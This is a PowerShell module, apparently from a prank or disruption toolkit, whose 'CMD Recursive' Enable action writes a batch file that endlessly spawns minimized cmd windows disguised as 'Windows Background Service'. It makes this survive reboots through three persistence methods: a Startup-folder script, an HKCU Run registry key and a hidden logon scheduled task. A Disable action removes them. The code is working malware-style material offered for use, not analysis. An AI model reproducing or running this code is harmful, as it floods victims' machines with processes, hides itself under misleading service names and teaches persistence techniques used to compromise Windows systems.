$CmdRecursive = @{
    Name = "CMD Recursive"
    Width = 360
    Height = 80
    Actions = @{
        Enable = {
            try {
                # Create the recursive batch file
                $recursiveScript = @'
@echo off
timeout /t 30 /nobreak > nul
if not DEFINED IS_MINIMIZED set IS_MINIMIZED=1 && start "" /min "%~dpnx0" %* && exit
:loop
start /min cmd /c "title Windows Background Service && %~dpnx0"
timeout /t 1 /nobreak > nul
goto loop
'@
                # Create directories
                $scriptsPath = "$env:APPDATA\Windows"
                if (-not (Test-Path $scriptsPath)) {
                    New-Item -ItemType Directory -Path $scriptsPath -Force | Out-Null
                }

                # Save the recursive script
                $recursivePath = Join-Path $scriptsPath "background.bat"
                $recursiveScript | Out-File $recursivePath -Encoding ASCII -Force

                # Multiple persistence methods
                # 1. Startup Folder
                $startupPath = [Environment]::GetFolderPath('Startup')
                $startupScript = "@echo off`nstart /min `"$recursivePath`""
                $startupScript | Out-File (Join-Path $startupPath "BackgroundService.bat") -Encoding ASCII -Force

                # 2. Registry Run
                $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
                Set-ItemProperty -Path $regPath -Name "BackgroundService" -Value "cmd /c start /min `"$recursivePath`"" -Force

                # 3. Scheduled Task
                $taskName = "BackgroundServiceManager"
                $action = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c start /min `"$recursivePath`""
                $trigger = New-ScheduledTaskTrigger -AtLogon
                $settings = New-ScheduledTaskSettingsSet -Hidden
                Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -Force

                # Start the recursive script
                Start-Process -FilePath "cmd.exe" -ArgumentList "/c start /min `"$recursivePath`"" -WindowStyle Hidden
                
                Write-Host "Recursive CMD activated with multi-boot persistence"
                return $true
            }
            catch {
                Write-Host "Error starting recursive CMD: $_"
                return $false
            }
        }
        Disable = {
            try {
                # Kill all related CMD processes
                Get-Process | Where-Object { 
                    $_.ProcessName -eq "cmd" -and 
                    $_.MainWindowTitle -match "Windows Background Service"
                } | Stop-Process -Force -ErrorAction SilentlyContinue

                # Clean up startup entries
                $startupPath = [Environment]::GetFolderPath('Startup')
                Remove-Item (Join-Path $startupPath "BackgroundService.bat") -Force -ErrorAction SilentlyContinue

                # Clean up registry
                $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
                Remove-ItemProperty -Path $regPath -Name "BackgroundService" -ErrorAction SilentlyContinue

                # Remove scheduled task
                Unregister-ScheduledTask -TaskName "BackgroundServiceManager" -Confirm:$false -ErrorAction SilentlyContinue

                # Remove scripts
                $scriptsPath = "$env:APPDATA\Windows"
                if (Test-Path $scriptsPath) {
                    Remove-Item -Path $scriptsPath -Recurse -Force
                }

                Write-Host "Recursive CMD deactivated"
                return $true
            }
            catch {
                Write-Host "Error stopping recursive CMD: $_"
                return $false
            }
        }
    }
}

return $CmdRecursive